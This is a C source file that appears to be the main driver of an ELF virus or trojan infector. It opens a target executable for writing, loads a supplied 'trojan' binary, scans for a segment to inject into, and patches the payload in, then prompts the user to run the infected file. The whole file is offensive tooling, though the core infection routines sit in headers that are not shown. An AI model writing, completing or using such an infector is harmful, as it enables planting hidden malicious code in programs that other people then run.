#include <string.h>
#include <errno.h>
#include <assert.h>
#include <unistd.h>
#include <assert.h>

#include "common.h"
#include "utils.h"
#include "log.h"
#include "elfo.h"
#include "parse.h"
#include "map.h"
#include "asm.h"
#include "print.h"
#include "validate.h"
#include "destroy.h"
#include "infect.h"

extern elf_info_t   _program[];

static bool doit(const char *binfile, const char *trojan) {
    ASSERT_CON_RET_FALSE(binfile && trojan);
    open_mode_t m1,m2;
    bool rc = false;
    const char *file = binfile;

    FILE *fp = file_open_rw(file, &m1);
    if (!fp) {
        log_error("Can't open target ELF\n");
        return rc;
    }

    FILE *trojanfp = file_open_ro(trojan, &m2);
    if (!trojanfp) {
        log_error("Can't open trojan binary\n");
        return rc;
    }

    if(!elf_validate_filetype(fp)) {
        log_error("Not a valid ELF file\n");
        return rc;
    }

    elf_t *elfo = elf_parse_file(file, fp, m1);

    infect_t *inf = inf_load(elfo, trojanfp, m1);
    if (inf_scan_segment(inf)) {
        if ((rc = inf_load_and_patch(inf, (long)0x1122334455667788)) == true)
            printf("Done!\nTry running %s\n", file);
        else
            printf("Failed :(\n");
    }

    assert(elf_destroy_all(elfo));
    file_close(fp);

    return rc;
}
int main(int argc, char **argv)
{
    if (argc < 3) {
        log_info("Use %s <elf file> <trojanfp>\n", argv[0]);
        asm_exit(0);
    }

    (void)doit(argv[1], argv[2]);

    return 0;
}
